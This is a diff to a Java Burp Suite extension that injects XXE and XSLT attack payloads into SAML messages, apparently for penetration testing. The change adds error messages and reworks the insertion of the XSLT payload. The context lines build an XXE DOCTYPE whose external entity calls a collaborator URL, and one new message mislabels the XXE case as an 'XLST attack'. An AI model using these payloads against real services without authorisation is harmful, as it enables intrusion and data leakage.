@@ -54,7 +54,9 @@ public class SamlTabController implements IMessageEditorTab, Observer {
 	private static final String XML_CERTIFICATE_NOT_FOUND = "X509 Certificate not found";
 	private static final String XSW_ATTACK_APPLIED = "XSW Attack applied";
 	private static final String XXE_CONTENT_APPLIED = "XXE content applied";
+	private static final String XML_NOT_SUITABLE_FOR_XXE = "This XML Message is not suitable for this particular XLST attack";
 	private static final String XSLT_CONTENT_APPLIED = "XSLT content applied";
+	private static final String XML_NOT_SUITABLE_FOR_XLST = "This XML Message is not suitable for this particular XLST attack";
 	private static final String XML_COULD_NOT_SIGN = "Could not sign XML";
 	private static final String XML_COULD_NOT_SERIALIZE = "Could not serialize XML";
 	private static final String XML_NOT_WELL_FORMED = "XML isn't well formed or binding is not supported";
@@ -611,7 +613,7 @@ public class SamlTabController implements IMessageEditorTab, Observer {
 		String dtd = "\n<!DOCTYPE foo [ <!ENTITY % xxe SYSTEM \""+collabUrl+"\"> %xxe; ]>";
 		String[] splitMsg = orgSAMLMessage.split("\\?>");
 		if(splitMsg.length != 2) {
-			setInfoMessageText(XML_NOT_SUITABLE_FOR_XSW);
+			setInfoMessageText(XML_NOT_SUITABLE_FOR_XXE);
 		}
 		else {
 			SAMLMessage = splitMsg[0]+"?>"+dtd+splitMsg[1];
@@ -631,12 +633,17 @@ public class SamlTabController implements IMessageEditorTab, Observer {
 				"</xsl:template>\n" + 
 				"</xsl:stylesheet>\n" + 
 				"</ds:Transform>";
-		String[] splitMsg = orgSAMLMessage.split("<ds:Transforms>");
-		if(splitMsg.length != 2) {
-			setInfoMessageText(XML_NOT_SUITABLE_FOR_XSW);
+		String transformString = "<ds:Transforms>";
+		int index = orgSAMLMessage.indexOf(transformString);
+		
+		if(index == -1) {
+			setInfoMessageText(XML_NOT_SUITABLE_FOR_XLST);
 		}
 		else {
-			SAMLMessage = splitMsg[0]+"<ds:Transforms>"+xslt+splitMsg[1];
+			int substringIndex = index + transformString.length();
+			String firstPart = orgSAMLMessage.substring(0, substringIndex);
+			String secondPart = orgSAMLMessage.substring(substringIndex);
+			SAMLMessage = firstPart + xslt + secondPart;
 			textArea.setText(SAMLMessage.getBytes());
 			setInfoMessageText(XSLT_CONTENT_APPLIED);
 		}		
